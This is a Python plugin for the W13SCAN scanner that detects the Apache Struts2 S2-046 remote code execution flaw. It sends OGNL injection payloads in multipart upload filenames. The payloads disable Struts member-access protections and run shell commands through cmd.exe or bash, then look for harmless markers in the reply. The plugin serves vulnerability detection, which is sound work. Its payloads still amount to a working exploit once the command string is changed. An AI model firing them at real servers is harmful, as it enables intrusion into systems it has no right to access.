#coding   :utf-8
#file     : struts2_046.py
#author   : go0p
#time     : 2019/8/18 1:54 PM
#software :PyCharm

import copy
import os
import random
import requests

from W13SCAN.lib.common import prepare_url
from W13SCAN.lib.const import acceptedExt, ignoreParams, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'Struts2-046远程代码执行'
    desc = ''''''
    level = Level.HIGHT

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        version = self.requests.request_version  # HTTP 0.9/1.0/1.1
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL
        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if self.response.language and self.response.language != "JAVA":
            return

        if method == 'GET':
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return

            ran_a = random.randint(10000000, 20000000)
            ran_b = random.randint(1000000, 2000000)
            ran_check = ran_a - ran_b
            lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)
            checks = [str(ran_check), '无法初始化设备 PRN', '??????? PRN', '<Struts2-vuln-Check>',
                    'Unable to initialize device PRN']
            boundary_046 = "---------------------------735323031399963166993862150"
            payloads = [
                r"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='print test').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
                r"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + lin + r"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
                r"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('<'+'Struts2-vuln-'+'Check>')).(#o.close())}",
                r"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#path=#req.getRealPath('Struts2-vuln-')).(#o.print(#path)).(#o.print('Check>')).(#o.close())}"
            ]

            headers['Content-Type'] = 'multipart/form-data; boundary=' + boundary_046 + ''
            for payload in payloads:
                data_046 = '--' + boundary_046 + "\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"" + payload + "\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--" + boundary_046 + "--"
                r = requests.post(url, headers=headers,data=data_046)
                html1 = r.text
                for check in checks:
                    if check in html1:
                        out.success(url, self.name, playload="{}".format(payload), method="POST", check=check,
                                    raw=r.raw)
                        return